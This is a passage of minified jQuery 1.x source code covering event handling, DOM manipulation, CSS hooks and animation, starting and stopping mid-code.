null==a.pageX&&null!=b.clientX&&(e=a.target.ownerDocument||d,f=e.documentElement,c=e.body,a.pageX=b.clientX+(f&&f.scrollLeft||c&&c.scrollLeft||0)-(f&&f.clientLeft||c&&c.clientLeft||0),a.pageY=b.clientY+(f&&f.scrollTop||c&&c.scrollTop||0)-(f&&f.clientTop||c&&c.clientTop||0)),!a.relatedTarget&&h&&(a.relatedTarget=h===a.target?b.toElement:h),a.which||void 0===g||(a.which=1&g?1:2&g?3:4&g?2:0),a}},special:{load:{noBubble:!0},focus:{trigger:function(){if(this!==ra()&&this.focus)try{return this.focus(),!1}catch(a){}},delegateType:"focusin"},blur:{trigger:function(){return this===ra()&&this.blur?(this.blur(),!1):void 0},delegateType:"focusout"},click:{trigger:function(){return n.nodeName(this,"input")&&"checkbox"===this.type&&this.click?(this.click(),!1):void 0},_default:function(a){return n.nodeName(a.target,"a")}},beforeunload:{postDispatch:function(a){void 0!==a.result&&a.originalEvent&&(a.originalEvent.returnValue=a.result)}}},simulate:function(a,b,c){var d=n.extend(new n.Event,c,{type:a,isSimulated:!0});n.event.trigger(d,null,b),d.isDefaultPrevented()&&c.preventDefault()}},n.removeEvent=d.removeEventListener?function(a,b,c){a.removeEventListener&&a.removeEventListener(b,c)}:function(a,b,c){var d="on"+b;a.detachEvent&&("undefined"==typeof a[d]&&(a[d]=null),a.detachEvent(d,c))},n.Event=function(a,b){return this instanceof n.Event?(a&&a.type?(this.originalEvent=a,this.type=a.type,this.isDefaultPrevented=a.defaultPrevented||void 0===a.defaultPrevented&&a.returnValue===!1?pa:qa):this.type=a,b&&n.extend(this,b),this.timeStamp=a&&a.timeStamp||n.now(),void(this[n.expando]=!0)):new n.Event(a,b)},n.Event.prototype={constructor:n.Event,isDefaultPrevented:qa,isPropagationStopped:qa,isImmediatePropagationStopped:qa,preventDefault:function(){var a=this.originalEvent;this.isDefaultPrevented=pa,a&&(a.preventDefault?a.preventDefault():a.returnValue=!1)},stopPropagation:function(){var a=this.originalEvent;this.isPropagationStopped=pa,a&&!this.isSimulated&&(a.stopPropagation&&a.stopPropagation(),a.cancelBubble=!0)},stopImmediatePropagation:function(){var a=this.originalEvent;this.isImmediatePropagationStopped=pa,a&&a.stopImmediatePropagation&&a.stopImmediatePropagation(),this.stopPropagation()}},n.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},function(a,b){n.event.special[a]={delegateType:b,bindType:b,handle:function(a){var c,d=this,e=a.relatedTarget,f=a.handleObj;return(!e||e!==d&&!n.contains(d,e))&&(a.type=f.origType,c=f.handler.apply(this,arguments),a.type=b),c}}}),l.submit||(n.event.special.submit={setup:function(){return n.nodeName(this,"form")?!1:void n.event.add(this,"click._submit keypress._submit",function(a){var b=a.target,c=n.nodeName(b,"input")||n.nodeName(b,"button")?n.prop(b,"form"):void 0;c&&!n._data(c,"submit")&&(n.event.add(c,"submit._submit",function(a){a._submitBubble=!0}),n._data(c,"submit",!0))})},postDispatch:function(a){a._submitBubble&&(delete a._submitBubble,this.parentNode&&!a.isTrigger&&n.event.simulate("submit",this.parentNode,a))},teardown:function(){return n.nodeName(this,"form")?!1:void n.event.remove(this,"._submit")}}),l.change||(n.event.special.change={setup:function(){return ka.test(this.nodeName)?(("checkbox"===this.type||"radio"===this.type)&&(n.event.add(this,"propertychange._change",function(a){"checked"===a.originalEvent.propertyName&&(this._justChanged=!0)}),n.event.add(this,"click._change",function(a){this._justChanged&&!a.isTrigger&&(this._justChanged=!1),n.event.simulate("change",this,a)})),!1):void n.event.add(this,"beforeactivate._change",function(a){var b=a.target;ka.test(b.nodeName)&&!n._data(b,"change")&&(n.event.add(b,"change._change",function(a){!this.parentNode||a.isSimulated||a.isTrigger||n.event.simulate("change",this.parentNode,a)}),n._data(b,"change",!0))})},handle:function(a){var b=a.target;return this!==b||a.isSimulated||a.isTrigger||"radio"!==b.type&&"checkbox"!==b.type?a.handleObj.handler.apply(this,arguments):void 0},teardown:function(){return n.event.remove(this,"._change"),!ka.test(this.nodeName)}}),l.focusin||n.each({focus:"focusin",blur:"focusout"},function(a,b){var c=function(a){n.event.simulate(b,a.target,n.event.fix(a))};n.event.special[b]={setup:function(){var d=this.ownerDocument||this,e=n._data(d,b);e||d.addEventListener(a,c,!0),n._data(d,b,(e||0)+1)},teardown:function(){var d=this.ownerDocument||this,e=n._data(d,b)-1;e?n._data(d,b,e):(d.removeEventListener(a,c,!0),n._removeData(d,b))}}}),n.fn.extend({on:function(a,b,c,d){return sa(this,a,b,c,d)},one:function(a,b,c,d){return sa(this,a,b,c,d,1)},off:function(a,b,c){var d,e;if(a&&a.preventDefault&&a.handleObj)return d=a.handleObj,n(a.delegateTarget).off(d.namespace?d.origType+"."+d.namespace:d.origType,d.selector,d.handler),this;if("object"==typeof a){for(e in a)this.off(e,b,a[e]);return this}return(b===!1||"function"==typeof b)&&(c=b,b=void 0),c===!1&&(c=qa),this.each(function(){n.event.remove(this,a,c,b)})},trigger:function(a,b){return this.each(function(){n.event.trigger(a,b,this)})},triggerHandler:function(a,b){var c=this[0];return c?n.event.trigger(a,b,c,!0):void 0}});var ta=/ jQuery\d+="(?:null|\d+)"/g,ua=new RegExp("<(?:"+ba+")[\\s/>]","i"),va=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:-]+)[^>]*)\/>/gi,wa=/<script|<style|<link/i,xa=/checked\s*(?:[^=]|=\s*.checked.)/i,ya=/^true\/(.*)/,za=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,Aa=ca(d),Ba=Aa.appendChild(d.createElement("div"));function Ca(a,b){return n.nodeName(a,"table")&&n.nodeName(11!==b.nodeType?b:b.firstChild,"tr")?a.getElementsByTagName("tbody")[0]||a.appendChild(a.ownerDocument.createElement("tbody")):a}function Da(a){return a.type=(null!==n.find.attr(a,"type"))+"/"+a.type,a}function Ea(a){var b=ya.exec(a.type);return b?a.type=b[1]:a.removeAttribute("type"),a}function Fa(a,b){if(1===b.nodeType&&n.hasData(a)){var c,d,e,f=n._data(a),g=n._data(b,f),h=f.events;if(h){delete g.handle,g.events={};for(c in h)for(d=0,e=h[c].length;e>d;d++)n.event.add(b,c,h[c][d])}g.data&&(g.data=n.extend({},g.data))}}function Ga(a,b){var c,d,e;if(1===b.nodeType){if(c=b.nodeName.toLowerCase(),!l.noCloneEvent&&b[n.expando]){e=n._data(b);for(d in e.events)n.removeEvent(b,d,e.handle);b.removeAttribute(n.expando)}"script"===c&&b.text!==a.text?(Da(b).text=a.text,Ea(b)):"object"===c?(b.parentNode&&(b.outerHTML=a.outerHTML),l.html5Clone&&a.innerHTML&&!n.trim(b.innerHTML)&&(b.innerHTML=a.innerHTML)):"input"===c&&Z.test(a.type)?(b.defaultChecked=b.checked=a.checked,b.value!==a.value&&(b.value=a.value)):"option"===c?b.defaultSelected=b.selected=a.defaultSelected:("input"===c||"textarea"===c)&&(b.defaultValue=a.defaultValue)}}function Ha(a,b,c,d){b=f.apply([],b);var e,g,h,i,j,k,m=0,o=a.length,p=o-1,q=b[0],r=n.isFunction(q);if(r||o>1&&"string"==typeof q&&!l.checkClone&&xa.test(q))return a.each(function(e){var f=a.eq(e);r&&(b[0]=q.call(this,e,f.html())),Ha(f,b,c,d)});if(o&&(k=ja(b,a[0].ownerDocument,!1,a,d),e=k.firstChild,1===k.childNodes.length&&(k=e),e||d)){for(i=n.map(ea(k,"script"),Da),h=i.length;o>m;m++)g=k,m!==p&&(g=n.clone(g,!0,!0),h&&n.merge(i,ea(g,"script"))),c.call(a[m],g,m);if(h)for(j=i[i.length-1].ownerDocument,n.map(i,Ea),m=0;h>m;m++)g=i[m],_.test(g.type||"")&&!n._data(g,"globalEval")&&n.contains(j,g)&&(g.src?n._evalUrl&&n._evalUrl(g.src):n.globalEval((g.text||g.textContent||g.innerHTML||"").replace(za,"")));k=e=null}return a}function Ia(a,b,c){for(var d,e=b?n.filter(b,a):a,f=0;null!=(d=e[f]);f++)c||1!==d.nodeType||n.cleanData(ea(d)),d.parentNode&&(c&&n.contains(d.ownerDocument,d)&&fa(ea(d,"script")),d.parentNode.removeChild(d));return a}n.extend({htmlPrefilter:function(a){return a.replace(va,"<$1></$2>")},clone:function(a,b,c){var d,e,f,g,h,i=n.contains(a.ownerDocument,a);if(l.html5Clone||n.isXMLDoc(a)||!ua.test("<"+a.nodeName+">")?f=a.cloneNode(!0):(Ba.innerHTML=a.outerHTML,Ba.removeChild(f=Ba.firstChild)),!(l.noCloneEvent&&l.noCloneChecked||1!==a.nodeType&&11!==a.nodeType||n.isXMLDoc(a)))for(d=ea(f),h=ea(a),g=0;null!=(e=h[g]);++g)d[g]&&Ga(e,d[g]);if(b)if(c)for(h=h||ea(a),d=d||ea(f),g=0;null!=(e=h[g]);g++)Fa(e,d[g]);else Fa(a,f);return d=ea(f,"script"),d.length>0&&fa(d,!i&&ea(a,"script")),d=h=e=null,f},cleanData:function(a,b){for(var d,e,f,g,h=0,i=n.expando,j=n.cache,k=l.attributes,m=n.event.special;null!=(d=a[h]);h++)if((b||M(d))&&(f=d[i],g=f&&j[f])){if(g.events)for(e in g.events)m[e]?n.event.remove(d,e):n.removeEvent(d,e,g.handle);j[f]&&(delete j[f],k||"undefined"==typeof d.removeAttribute?d[i]=void 0:d.removeAttribute(i),c.push(f))}}}),n.fn.extend({domManip:Ha,detach:function(a){return Ia(this,a,!0)},remove:function(a){return Ia(this,a)},text:function(a){return Y(this,function(a){return void 0===a?n.text(this):this.empty().append((this[0]&&this[0].ownerDocument||d).createTextNode(a))},null,a,arguments.length)},append:function(){return Ha(this,arguments,function(a){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var b=Ca(this,a);b.appendChild(a)}})},prepend:function(){return Ha(this,arguments,function(a){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var b=Ca(this,a);b.insertBefore(a,b.firstChild)}})},before:function(){return Ha(this,arguments,function(a){this.parentNode&&this.parentNode.insertBefore(a,this)})},after:function(){return Ha(this,arguments,function(a){this.parentNode&&this.parentNode.insertBefore(a,this.nextSibling)})},empty:function(){for(var a,b=0;null!=(a=this[b]);b++){1===a.nodeType&&n.cleanData(ea(a,!1));while(a.firstChild)a.removeChild(a.firstChild);a.options&&n.nodeName(a,"select")&&(a.options.length=0)}return this},clone:function(a,b){return a=null==a?!1:a,b=null==b?a:b,this.map(function(){return n.clone(this,a,b)})},html:function(a){return Y(this,function(a){var b=this[0]||{},c=0,d=this.length;if(void 0===a)return 1===b.nodeType?b.innerHTML.replace(ta,""):void 0;if("string"==typeof a&&!wa.test(a)&&(l.htmlSerialize||!ua.test(a))&&(l.leadingWhitespace||!aa.test(a))&&!da[($.exec(a)||["",""])[1].toLowerCase()]){a=n.htmlPrefilter(a);try{for(;d>c;c++)b=this[c]||{},1===b.nodeType&&(n.cleanData(ea(b,!1)),b.innerHTML=a);b=0}catch(e){}}b&&this.empty().append(a)},null,a,arguments.length)},replaceWith:function(){var a=[];return Ha(this,arguments,function(b){var c=this.parentNode;n.inArray(this,a)<0&&(n.cleanData(ea(this)),c&&c.replaceChild(b,this))},a)}}),n.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(a,b){n.fn[a]=function(a){for(var c,d=0,e=[],f=n(a),h=f.length-1;h>=d;d++)c=d===h?this:this.clone(!0),n(f[d])[b](c),g.apply(e,c.get());return this.pushStack(e)}});var Ja,Ka={HTML:"block",BODY:"block"};function La(a,b){var c=n(b.createElement(a)).appendTo(b.body),d=n.css(c[0],"display");return c.detach(),d}function Ma(a){var b=d,c=Ka[a];return c||(c=La(a,b),"none"!==c&&c||(Ja=(Ja||n("<iframe frameborder='0' width='0' height='0'/>")).appendTo(b.documentElement),b=(Ja[0].contentWindow||Ja[0].contentDocument).document,b.write(),b.close(),c=La(a,b),Ja.detach()),Ka[a]=c),c}var Na=/^margin/,Oa=new RegExp("^("+T+")(?!px)[a-z%]+$","i"),Pa=function(a,b,c,d){var e,f,g={};for(f in b)g[f]=a.style[f],a.style[f]=b[f];e=c.apply(a,d||[]);for(f in b)a.style[f]=g[f];return e},Qa=d.documentElement;!function(){var b,c,e,f,g,h,i=d.createElement("div"),j=d.createElement("div");if(j.style){j.style.cssText="float:left;opacity:.5",l.opacity="0.5"===j.style.opacity,l.cssFloat=!!j.style.cssFloat,j.style.backgroundClip="content-box",j.cloneNode(!0).style.backgroundClip="",l.clearCloneStyle="content-box"===j.style.backgroundClip,i=d.createElement("div"),i.style.cssText="border:0;width:8px;height:0;top:0;left:-9999px;padding:0;margin-top:1px;position:absolute",j.innerHTML="",i.appendChild(j),l.boxSizing=""===j.style.boxSizing||""===j.style.MozBoxSizing||""===j.style.WebkitBoxSizing,n.extend(l,{reliableHiddenOffsets:function(){return null==b&&k(),f},boxSizingReliable:function(){return null==b&&k(),e},pixelMarginRight:function(){return null==b&&k(),c},pixelPosition:function(){return null==b&&k(),b},reliableMarginRight:function(){return null==b&&k(),g},reliableMarginLeft:function(){return null==b&&k(),h}});function k(){var k,l,m=d.documentElement;m.appendChild(i),j.style.cssText="-webkit-box-sizing:border-box;box-sizing:border-box;position:relative;display:block;margin:auto;border:1px;padding:1px;top:1%;width:50%",b=e=h=!1,c=g=!0,a.getComputedStyle&&(l=a.getComputedStyle(j),b="1%"!==(l||{}).top,h="2px"===(l||{}).marginLeft,e="4px"===(l||{width:"4px"}).width,j.style.marginRight="50%",c="4px"===(l||{marginRight:"4px"}).marginRight,k=j.appendChild(d.createElement("div")),k.style.cssText=j.style.cssText="-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0",k.style.marginRight=k.style.width="0",j.style.width="1px",g=!parseFloat((a.getComputedStyle(k)||{}).marginRight),j.removeChild(k)),j.style.display="none",f=0===j.getClientRects().length,f&&(j.style.display="",j.innerHTML="<table><tr><td></td><td>t</td></tr></table>",k=j.getElementsByTagName("td"),k[0].style.cssText="margin:0;border:0;padding:0;display:none",f=0===k[0].offsetHeight,f&&(k[0].style.display="",k[1].style.display="none",f=0===k[0].offsetHeight)),m.removeChild(i)}}}();var Ra,Sa,Ta=/^(top|right|bottom|left)$/;a.getComputedStyle?(Ra=function(b){var c=b.ownerDocument.defaultView;return c&&c.opener||(c=a),c.getComputedStyle(b)},Sa=function(a,b,c){var d,e,f,g,h=a.style;return c=c||Ra(a),g=c?c.getPropertyValue(b)||c[b]:void 0,""!==g&&void 0!==g||n.contains(a.ownerDocument,a)||(g=n.style(a,b)),c&&!l.pixelMarginRight()&&Oa.test(g)&&Na.test(b)&&(d=h.width,e=h.minWidth,f=h.maxWidth,h.minWidth=h.maxWidth=h.width=g,g=c.width,h.width=d,h.minWidth=e,h.maxWidth=f),void 0===g?g:g+""}):Qa.currentStyle&&(Ra=function(a){return a.currentStyle},Sa=function(a,b,c){var d,e,f,g,h=a.style;return c=c||Ra(a),g=c?c[b]:void 0,null==g&&h&&h[b]&&(g=h[b]),Oa.test(g)&&!Ta.test(b)&&(d=h.left,e=a.runtimeStyle,f=e&&e.left,f&&(e.left=a.currentStyle.left),h.left="fontSize"===b?"1em":g,g=h.pixelLeft+"px",h.left=d,f&&(e.left=f)),void 0===g?g:g+""||"auto"});function Ua(a,b){return{get:function(){return a()?void delete this.get:(this.get=b).apply(this,arguments)}}}var Va=/alpha\([^)]*\)/i,Wa=/opacity\s*=\s*([^)]*)/i,Xa=/^(none|table(?!-c[ea]).+)/,Ya=new RegExp("^("+T+")(.*)$","i"),Za={position:"absolute",visibility:"hidden",display:"block"},$a={letterSpacing:"0",fontWeight:"400"},_a=["Webkit","O","Moz","ms"],ab=d.createElement("div").style;function bb(a){if(a in ab)return a;var b=a.charAt(0).toUpperCase()+a.slice(1),c=_a.length;while(c--)if(a=_a[c]+b,a in ab)return a}function cb(a,b){for(var c,d,e,f=[],g=0,h=a.length;h>g;g++)d=a[g],d.style&&(f[g]=n._data(d,"olddisplay"),c=d.style.display,b?(f[g]||"none"!==c||(d.style.display=""),""===d.style.display&&W(d)&&(f[g]=n._data(d,"olddisplay",Ma(d.nodeName)))):(e=W(d),(c&&"none"!==c||!e)&&n._data(d,"olddisplay",e?c:n.css(d,"display"))));for(g=0;h>g;g++)d=a[g],d.style&&(b&&"none"!==d.style.display&&""!==d.style.display||(d.style.display=b?f[g]||"":"none"));return a}function db(a,b,c){var d=Ya.exec(b);return d?Math.max(0,d[1]-(c||0))+(d[2]||"px"):b}function eb(a,b,c,d,e){for(var f=c===(d?"border":"content")?4:"width"===b?1:0,g=0;4>f;f+=2)"margin"===c&&(g+=n.css(a,c+V[f],!0,e)),d?("content"===c&&(g-=n.css(a,"padding"+V[f],!0,e)),"margin"!==c&&(g-=n.css(a,"border"+V[f]+"Width",!0,e))):(g+=n.css(a,"padding"+V[f],!0,e),"padding"!==c&&(g+=n.css(a,"border"+V[f]+"Width",!0,e)));return g}function fb(b,c,e){var f=!0,g="width"===c?b.offsetWidth:b.offsetHeight,h=Ra(b),i=l.boxSizing&&"border-box"===n.css(b,"boxSizing",!1,h);if(d.msFullscreenElement&&a.top!==a&&b.getClientRects().length&&(g=Math.round(100*b.getBoundingClientRect()[c])),0>=g||null==g){if(g=Sa(b,c,h),(0>g||null==g)&&(g=b.style[c]),Oa.test(g))return g;f=i&&(l.boxSizingReliable()||g===b.style[c]),g=parseFloat(g)||0}return g+eb(b,c,e||(i?"border":"content"),f,h)+"px"}n.extend({cssHooks:{opacity:{get:function(a,b){if(b){var c=Sa(a,"opacity");return""===c?"1":c}}}},cssNumber:{animationIterationCount:!0,columnCount:!0,fillOpacity:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{"float":l.cssFloat?"cssFloat":"styleFloat"},style:function(a,b,c,d){if(a&&3!==a.nodeType&&8!==a.nodeType&&a.style){var e,f,g,h=n.camelCase(b),i=a.style;if(b=n.cssProps[h]||(n.cssProps[h]=bb(h)||h),g=n.cssHooks[b]||n.cssHooks[h],void 0===c)return g&&"get"in g&&void 0!==(e=g.get(a,!1,d))?e:i[b];if(f=typeof c,"string"===f&&(e=U.exec(c))&&e[1]&&(c=X(a,b,e),f="number"),null!=c&&c===c&&("number"===f&&(c+=e&&e[3]||(n.cssNumber[h]?"":"px")),l.clearCloneStyle||""!==c||0!==b.indexOf("background")||(i[b]="inherit"),!(g&&"set"in g&&void 0===(c=g.set(a,c,d)))))try{i[b]=c}catch(j){}}},css:function(a,b,c,d){var e,f,g,h=n.camelCase(b);return b=n.cssProps[h]||(n.cssProps[h]=bb(h)||h),g=n.cssHooks[b]||n.cssHooks[h],g&&"get"in g&&(f=g.get(a,!0,c)),void 0===f&&(f=Sa(a,b,d)),"normal"===f&&b in $a&&(f=$a[b]),""===c||c?(e=parseFloat(f),c===!0||isFinite(e)?e||0:f):f}}),n.each(["height","width"],function(a,b){n.cssHooks[b]={get:function(a,c,d){return c?Xa.test(n.css(a,"display"))&&0===a.offsetWidth?Pa(a,Za,function(){return fb(a,b,d)}):fb(a,b,d):void 0},set:function(a,c,d){var e=d&&Ra(a);return db(a,c,d?eb(a,b,d,l.boxSizing&&"border-box"===n.css(a,"boxSizing",!1,e),e):0)}}}),l.opacity||(n.cssHooks.opacity={get:function(a,b){return Wa.test((b&&a.currentStyle?a.currentStyle.filter:a.style.filter)||"")?.01*parseFloat(RegExp.$1)+"":b?"1":""},set:function(a,b){var c=a.style,d=a.currentStyle,e=n.isNumeric(b)?"alpha(opacity="+100*b+")":"",f=d&&d.filter||c.filter||"";c.zoom=1,(b>=1||""===b)&&""===n.trim(f.replace(Va,""))&&c.removeAttribute&&(c.removeAttribute("filter"),""===b||d&&!d.filter)||(c.filter=Va.test(f)?f.replace(Va,e):f+" "+e)}}),n.cssHooks.marginRight=Ua(l.reliableMarginRight,function(a,b){return b?Pa(a,{display:"inline-block"},Sa,[a,"marginRight"]):void 0}),n.cssHooks.marginLeft=Ua(l.reliableMarginLeft,function(a,b){
return b?(parseFloat(Sa(a,"marginLeft"))||(n.contains(a.ownerDocument,a)?a.getBoundingClientRect().left-Pa(a,{marginLeft:0},function(){return a.getBoundingClientRect().left}):0))+"px":void 0}),n.each({margin:"",padding:"",border:"Width"},function(a,b){n.cssHooks[a+b]={expand:function(c){for(var d=0,e={},f="string"==typeof c?c.split(" "):[c];4>d;d++)e[a+V[d]+b]=f[d]||f[d-2]||f[0];return e}},Na.test(a)||(n.cssHooks[a+b].set=db)}),n.fn.extend({css:function(a,b){return Y(this,function(a,b,c){var d,e,f={},g=0;if(n.isArray(b)){for(d=Ra(a),e=b.length;e>g;g++)f[b[g]]=n.css(a,b[g],!1,d);return f}return void 0!==c?n.style(a,b,c):n.css(a,b)},a,b,arguments.length>1)},show:function(){return cb(this,!0)},hide:function(){return cb(this)},toggle:function(a){return"boolean"==typeof a?a?this.show():this.hide():this.each(function(){W(this)?n(this).show():n(this).hide()})}});function gb(a,b,c,d,e){return new gb.prototype.init(a,b,c,d,e)}n.Tween=gb,gb.prototype={constructor:gb,init:function(a,b,c,d,e,f){this.elem=a,this.prop=c,this.easing=e||n.easing._default,this.options=b,this.start=this.now=this.cur(),this.end=d,this.unit=f||(n.cssNumber[c]?"":"px")},cur:function(){var a=gb.propHooks[this.prop];return a&&a.get?a.get(this):gb.propHooks._default.get(this)},run:function(a){var b,c=gb.propHooks[this.prop];return this.options.duration?this.pos=b=n.easing[this.easing](a,this.options.duration*a,0,1,this.options.duration):this.pos=b=a,this.now=(this.end-this.start)*b+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),c&&c.set?c.set(this):gb.propHooks._default.set(this),this}},gb.prototype.init.prototype=gb.prototype,gb.propHooks={_default:{get:function(a){var b;return 1!==a.elem.nodeType||null!=a.elem[a.prop]&&null==a.elem.style[a.prop]?a.elem[a.prop]:(b=n.css(a.elem,a.prop,""),b&&"auto"!==b?b:0)},set:function(a){n.fx.step[a.prop]?n.fx.step[a.prop](a):1!==a.elem.nodeType||null==a.elem.style[n.cssProps[a.prop]]&&!n.cssHooks[a.prop]?a.elem[a.prop]=a.now:n.style(a.elem,a.prop,a.now+a.unit)}}},gb.propHooks.scrollTop=gb.propHooks.scrollLeft={set:function(a){a.elem.nodeType&&a.elem.parentNode&&(a.elem[a.prop]=a.now)}},n.easing={linear:function(a){return a},swing:function(a){return.5-Math.cos(a*Math.PI)/2},_default:"swing"},n.fx=gb.prototype.init,n.fx.step={};var hb,ib,jb=/^(?:toggle|show|hide)$/,kb=/queueHooks$/;function lb(){return a.setTimeout(function(){hb=void 0}),hb=n.now()}function mb(a,b){var c,d={height:a},e=0;for(b=b?1:0;4>e;e+=2-b)c=V[e],d["margin"+c]=d["padding"+c]=a;return b&&(d.opacity=d.width=a),d}function nb(a,b,c){for(var d,e=(qb.tweeners[b]||[]).concat(qb.tweeners["*"]),f=0,g=e.length;g>f;f++)if(d=e[f].call(c,b,a))return d}function ob(a,b,c){var d,e,f,g,h,i,j,k,m=this,o={},p=a.style,q=a.nodeType&&W(a),r=n._data(a,"fxshow");c.queue||(h=n._queueHooks(a,"fx"),null==h.unqueued&&(h.unqueued=0,i=h.empty.fire,h.empty.fire=function(){h.unqueued||i()}),h.unqueued++,m.always(function(){m.always(function(){h.unqueued--,n.queue(a,"fx").length||h.empty.fire()})})),1===a.nodeType&&("height"in b||"width"in b)&&(c.overflow=[p.overflow,p.overflowX,p.overflowY],j=n.css(a,"display"),k="none"===j?n._data(a,"olddisplay")||Ma(a.nodeName):j,"inline"===k&&"none"===n.css(a,"float")&&(l.inlineBlockNeedsLayout&&"inline"!==Ma(a.nodeName)?p.zoom=1:p.display="inline-block")),c.overflow&&(p.overflow="hidden",l.shrinkWrapBlocks()||m.always(function(){p.overflow=c.overflow[0],p.overflowX=c.overflow[1],p.overflowY=c.overflow[2]}));for(d in b)if(e=b[d],jb.exec(e)){if(delete b[d],f=f||"toggle"===e,e===(q?"hide":"show")){if("show"!==e||!r||void 0===r[d])continue;q=!0}o[d]=r&&r[d]||n.style(a,d)}else j=void 0;if(n.isEmptyObject(o))"inline"===("none"===j?Ma(a.nodeName):j)&&(p.display=j);else{r?"hidden"in r&&(q=r.hidden):r=n._data(a,"fxshow",{}),f&&(r.hidden=!q),q?n(a).show():m.done(function(){n(a).hide()}),m.done(function(){var b;n._removeData(a,"fxshow");for(b in o)n.style(a,b,o[b])});for(d in o)g=nb(q?r[d]:0,d,m),d in r||(r[d]=g.start,q&&(g.end=g.start,g.start="width"===d||"height"===d?1:0))}}function pb(a,b){var c,d,e,f,g;for(c in a)if(d=n.camelCase(c),e=b[d],f=a[c],n.isArray(f)&&(e=f[1],f=a[c]=f[0]),c!==d&&(a[d]=f,delete a[c]),g=n.cssHooks[d],g&&"expand"in g){f=g.expand(f),delete a[d];for(c in f)c in a||(a[c]=f[c],b[c]=e)}else b[d]=e}function qb(a,b,c){var d,e,f=0,g=qb.prefilters.length,h=n.Deferred().always(function(){delete i.elem}),i=function(){if(e)return!1;for(var b=hb||lb(),c=Math.max(0,j.startTime+j.duration-b),d=c/j.duration||0,f=1-d,g=0,i=j.tweens.length;i>g;g++)j.tweens[g].run(f);return h.notifyWith(a,[j,f,c]),1>f&&i?c:(h.resolveWith(a,[j]),!1)},j=h.promise({elem:a,props:n.extend({},b),opts:n.extend(!0,{specialEasing:{},easing:n.easing._default},c),originalProperties:b,originalOptions:c,startTime:hb||lb(),duration:c.duration,tweens:[],createTween:function(b,c){var d=n.Tween(a,j.opts,b,c,j.opts.specialEasing[b]||j.opts.easing);return j.tweens.push(d),d},stop:function(b){var c=0,d=b?j.tweens.length:0;if(e)return this;for(e=!0;d>c;c++)j.tweens[c].run(1);return b?(h.notifyWith(a,[j,1,0]),h.resolveWith(a,[j,b])):h.rejectWith(a,[j,b]),this}}),k=j.props;for(pb(k,j.opts.specialEasing);g>f;f++)if(d=qb.prefilters[f].call(j,a,k,j.opts))return n.isFunction(d.stop)&&(n._queueHooks(j.elem,j.opts.queue).stop=n.proxy(d.stop,d)),d;return n.map(k,nb,j),n.isFunction(j.opts.start)&&j.opts.start.call(a,j),n.fx.timer(n.extend(i,{elem:a,anim:j,queue:j.opts.queue})),j.progress(j.opts.progress).done(j.opts.done,j.opts.complete).fail(j.opts.fail).always(j.opts.always)}n.Animation=n.extend(qb,{tweeners:{"*":[function(a,b){var c=this.createTween(a,b);return X(c.elem,a,U.exec(b),c),c}]},tweener:function(a,b){n.isFunction(a)?(b=a,a=["*"]):a=a.match(G);for(var c,d=0,e=a.length;e>d;d++)c=a[d],qb.tweeners[c]=qb.tweeners[c]||[],qb.tweeners[c].unshift(b)},prefilters:[ob],prefilter:function(a,b){b?qb.prefilters.unshift(a):qb.prefilters.push(a)}}),n.speed=function(a,b,c){var d=a&&"object"==typeof a?n.extend({},a):{complete:c||!c&&b||n.isFunction(a)&&a,duration:a,easing:c&&b||b&&!n.isFunction(b)&&b};return d.duration=n.fx.off?0:"number"==typeof d.duration?d.duration:d.duration in n.fx.speeds?n.fx.speeds[d.duration]:n.fx.speeds._default,(null==d.queue||d.queue===!0)&&(d.queue="fx"),d.old=d.complete,d.complete=function(){n.isFunction(d.old)&&d.old.call(this),d.queue&&n.dequeue(this,d.queue)},d},n.fn.extend({fadeTo:function(a,b,c,d){return this.filter(W).css("opacity",0).show().end().animate({opacity:b},a,c,d)},animate:function(a,b,c,d){var e=n.isEmptyObject(a),f=n.speed(b,c,d),g=function(){var b=qb(this,n.extend({},a),f);(e||n._data(this,"finish"))&&b.stop(!0)};return g.finish=g,e||f.queue===!1?this.each(g):this.queue(f.queue,g)},stop:function(a,b,c){var d=function(a){var b=a.stop;delete a.stop,b(c)};return"string"!=typeof a&&(c=b,b=a,a=void 0),b&&a!==!1&&this.queue(a||"fx",[]),this.each(function(){var b=!0,e=null!=a&&a+"queueHooks",f=n.timers,g=n._data(this);if(e)g[e]&&g[e].stop&&d(g[e]);else for(e in g)g[e]&&g[e].stop&&kb.test(e)&&d(g[e]);for(e=f.length;e--;)f[e].elem!==this||null!=a&&f[e].queue!==a||(f[e].anim.stop(c),b=!1,f.splice(e,1));(b||!c)&&n.dequeue(this,a)})},finish:function(a){return a!==!1&&(a=a||"fx"),this.each(function(){var b,c=n._data(this),d=c[a+"queue"],e=c[a+"queueHooks"],f=n.timers,g=d?d.length:0;for(c.finish=!0,n.queue(this,a,[]),e&&e.stop&&e.stop.call(this,!0),b=f.length;b--;)f[b].elem===this&&f[b].queue===a&&(f[b].anim.stop(!0),f.splice(b,1));for(b=0;g>b;b++)d[b]&&d[b].finish&&d[b].finish.call(this);delete c.finish})}}),n.each(["toggle","show","hide"],function(a,b){var c=n.fn[b];n.fn[b]=function(a,d,e){return null==a||"boolean"==typeof a?c.apply(this,arguments):this.animate(mb(b,!0),a,d,e)}}),n.each({slideDown:mb("show"),slideUp:mb("hide"),slideToggle:mb("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(a,b){n.fn[a]=function(a,c,d){return this.animate(b,a,c,d)}}),n.timers=[],n.fx.tick=function(){var a,b=n.timers,c=0;for(hb=n.now();c<b.length;c++)a=b[c],a()||b[c]!==a||b.splice(c--,1);b.length||n.fx.stop(),hb=void 0},n.fx.timer=function(a){n.timers.push(a),a()?n.fx.start():n.timers.pop()},n.fx.interval=13,n.fx.start=function(){ib||(ib=a.setInterval(n.fx.tick,n.fx.interval))},n.fx.stop=function(){a.clearInterval(ib),ib=null},n.fx.speeds={slow:600,fast:200,_default:400},n.fn.delay=function(b,c){return 